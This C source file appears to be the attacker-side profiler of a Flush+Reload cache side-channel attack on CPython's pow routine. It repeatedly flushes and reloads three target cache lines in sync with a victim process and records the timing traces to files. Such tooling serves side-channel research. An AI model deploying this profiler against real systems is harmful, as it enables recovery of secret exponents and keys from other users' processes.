#include "cpython_pow.h"

#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "flush_reload.h"
#include "fs.h"
#include "log.h"
#include "shared_memory.h"

#define CACHE_LINE_COUNT (3)
#define PROFILE_ITERATIONS (3 << 12)

static const uint64_t waiting_time = 80000;

uint64_t sample_tsc[PROFILE_ITERATIONS][CACHE_LINE_COUNT];
uint64_t reload_time[PROFILE_ITERATIONS][CACHE_LINE_COUNT];
uint64_t victim_iteration = 64;

sync_ctx_t sync_ctx;

CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE)

void profile() {
    init_sync_ctx(CPYTHON_PROJ_ID);

    log_info("Wait for victim initialization");

    pthread_barrier_wait(sync_ctx.barrier);

    CPYTHON_TARGET_CACHELINE(TARGET_ADDRESS_OFFSET)

    create_directory("output");

    for (int i = 0; i < victim_iteration; ++i) {
        char output_file[32];
        sprintf(output_file, "output/%d.out", i);
        FILE *fp = fopen(output_file, "w");
        if (fp == NULL) {
            log_error("Error opening output_file %s", output_file);
            exit(1);
        }

        int index = 0;
        sync_ctx_set_action(SYNC_CTX_START);
        pthread_barrier_wait(sync_ctx.barrier);

        while (index < PROFILE_ITERATIONS) {
            FLUSH_CACHE_LINE(consume_zero, 2);
            FLUSH_CACHE_LINE(absorb_window, 2);
            FLUSH_CACHE_LINE(absorb_trailing, 2);

            FR_wait(waiting_time);

            RELOAD_CACHE_LINE(consume_zero, 2, 0);
            RELOAD_CACHE_LINE(absorb_window, 2, 1);
            RELOAD_CACHE_LINE(absorb_trailing, 2, 2);

            ++index;
        }

        if (sync_ctx_get_action() == SYNC_CTX_START) {
            log_warn("Insufficient profiler iterations");
        }

        pthread_barrier_wait(sync_ctx.barrier);

        for (int p = 0; p < index; ++p) {
            for (int c = 0; c < CACHE_LINE_COUNT; ++c) {
                fprintf(fp, "%lu:%lu ", sample_tsc[p][c], reload_time[p][c]);
            }
            fprintf(fp, "\n");
        }
        fclose(fp);

        memset(sample_tsc, 0,  PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
        memset(reload_time, 0, PROFILE_ITERATIONS * CACHE_LINE_COUNT * sizeof(uint64_t));
    }

    sync_ctx_set_action(SYNC_CTX_EXIT);
    pthread_barrier_wait(sync_ctx.barrier);
}

int main(int argc, char **argv) {
    pin_cpu(pinned_cpu0);

    if (argc > 1) {
        char *endptr = NULL;
        errno = 0;
        const uint64_t value = strtoull(argv[1], &endptr, 10);
        if (errno == 0 && endptr != argv[1] && *endptr == '\0') {
            victim_iteration = value;
        }
    }

    if (victim_iteration == 0) {
        log_error("python iterations has to be non-zero");
        exit(1);
    }

    profile();
}
